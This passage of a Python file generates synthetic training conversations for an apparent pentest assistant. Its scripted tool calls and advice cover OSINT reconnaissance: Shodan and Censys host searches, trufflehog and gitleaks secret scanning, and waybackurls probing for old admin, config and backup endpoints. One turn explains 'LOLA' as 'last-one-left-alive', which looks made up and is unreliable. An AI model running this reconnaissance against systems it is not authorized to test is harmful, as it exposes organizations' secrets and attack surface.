        msg("assistant", "Three ASN-linked hosts. Bastion on 22 is the LOLA target (last-one-left-alive — if you can compromise it, lateral movement opens up). Check Shodan history for each IP — firmware versions at past timestamps sometimes leak more than current."),
    ]


def osint_censys(query: str) -> list[dict]:
    return [
        msg("user", f"Censys for: {query}"),
        msg("assistant",
            tc("shell", cmd=f"censys search '{query}' --index-type hosts --fields ip,services.port,services.service_name,autonomous_system.organization")),
        msg("tool", "[\"203.0.113.10\", [80, 443, 22], [\"HTTP\",\"HTTPS\",\"SSH\"], \"Acme Corp\"]"),
        msg("assistant", "Censys is better than Shodan for TLS cert sibling discovery. `censys search 'services.tls.certificates.leaf_data.subject_dn: \"CN=*.acme.corp\"'` often finds hosts that don't appear in DNS enumeration."),
    ]


def osint_trufflehog_github(org: str) -> list[dict]:
    return [
        msg("user", f"Scan GitHub org `{org}` for leaked secrets."),
        msg("assistant",
            tc("shell", cmd=f"trufflehog github --org={org} --json | jq 'select(.Verified==true)'")),
        msg("tool",
            "{\"DetectorName\":\"AWS\",\"Verified\":true,\"Raw\":\"AKIAEX...\",\"SourceMetadata\":{\"github\":{\"repository\":\"acme/internal-tools\",\"commit\":\"abc123\",\"file\":\"deploy.sh\"}}}\n"
            "{\"DetectorName\":\"Stripe\",\"Verified\":true,\"Raw\":\"sk_live_...\",\"SourceMetadata\":{\"github\":{\"repository\":\"acme/billing\",\"commit\":\"def456\",\"file\":\".env.example\"}}}"),
        msg("assistant", "Two verified, active secrets committed to public repos. AWS + Stripe live key. Report-grade critical findings; retroactive revocation is on the client's side. Also check `--include-paths` for commit history beyond HEAD."),
    ]


def osint_waybackurls(domain: str) -> list[dict]:
    return [
        msg("user", f"Historical URLs for {domain}."),
        msg("assistant",
            "waybackurls pulls every URL archive.org crawled for this domain — sometimes reveals admin paths long since removed from current site.\n"
            + tc("shell", cmd=f"waybackurls {domain} | sort -u | grep -iE 'api|admin|debug|internal|config' | head -50")),
        msg("tool",
            f"https://{domain}/admin/login.old\n"
            f"https://{domain}/api/v1/internal/debug\n"
            f"https://{domain}/config.json\n"
            f"https://{domain}/backup/2019-db-dump.sql"),
        msg("assistant", "Historical endpoints sometimes still respond — `/config.json`, `/backup/*`, and `/api/*/debug` are the high-yield targets. Test each with `httpx -status-code -title` to see what's still live."),
    ]


def osint_gitleaks_repo(repo: str) -> list[dict]:
    return [
        msg("user", f"Audit local clone of {repo} for secrets in full git history."),
        msg("assistant",
            tc("shell", cmd=f"gitleaks detect --source={repo} --report-format=json --report-path=leaks.json && jq '.[] | select(.Match != null) | {{file:.File, secret:.Secret[:20], rule:.RuleID}}' leaks.json")),
        msg("tool", "{\"file\":\"config/prod.yml\",\"secret\":\"AKIAEXAMPLE...\",\"rule\":\"aws-access-key\"}\n{\"file\":\"scripts/deploy.sh\",\"secret\":\"ghp_abc123...\",\"rule\":\"github-pat\"}"),
        msg("assistant", "AWS key and GitHub PAT in history. `gitleaks` walks every commit so secrets removed later still surface. For repo owners: `bfg-repo-cleaner` rewrites history to remove them (coordinated revocation required first)."),
    ]


OSINT_ADV: list[list[dict]] = []
for q in ["org:\"Acme Corp\" port:22", "org:\"Acme Corp\" http.title:\"Login\"",
          "org:\"MegaCorp\" product:\"Jenkins\"", "cpe:\"apache:httpd:2.4.49\""]:
    OSINT_ADV.append(osint_shodan(q))
for q in ["services.service_name:ELASTICSEARCH", "services.tls.certificates.leaf_data.subject_dn:\"CN=*.corp\""]:
    OSINT_ADV.append(osint_censys(q))
for org in ["acme-corp", "megacorp", "example-inc"]:
    OSINT_ADV.append(osint_trufflehog_github(org))
for dom in ["acme.corp", "megacorp.com", "example.org", "target.thm"]:
    OSINT_ADV.append(osint_waybackurls(dom))
for repo in ["./corp-app", "./megacorp-api", "./example-backend"]:
    OSINT_ADV.append(osint_gitleaks_repo(repo))


# ===========================================================================
# Assembly
# ===========================================================================

ALL_V8: dict[str, list[list[dict]]] = {
    "anti_hallucination": ANTI_HALLU,
    "output_interpretation": OI_ALL,
    "ad_advanced": AD_ADVANCED,
    "cloud_pentest": CLOUD_PENTEST,
    "web_deep": WEB_DEEP,
    "network_specific": NETWORK_SPEC,
    "wireless_mobile": WIRELESS_MOBILE,
    "osint_advanced": OSINT_ADV,
}


def counts() -> dict[str, int]:
    return {k: len(v) for k, v in ALL_V8.items()}


if __name__ == "__main__":
    c = counts()
    total = sum(c.values())
    print("v8 corpus categories:")
    for k, v in c.items():
        print(f"  {k:30s} {v}")
    print(f"  {'TOTAL':30s} {total}")
